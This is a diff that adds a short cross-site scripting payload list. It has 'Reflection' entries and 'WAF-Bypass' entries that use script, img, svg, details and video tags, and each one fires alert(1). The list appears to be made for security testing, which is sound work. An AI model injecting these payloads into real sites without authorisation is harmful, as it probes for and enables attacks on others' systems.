@@ -1,0 +1,9 @@
+# [Reflection]
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+
+# [WAF-Bypass]
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
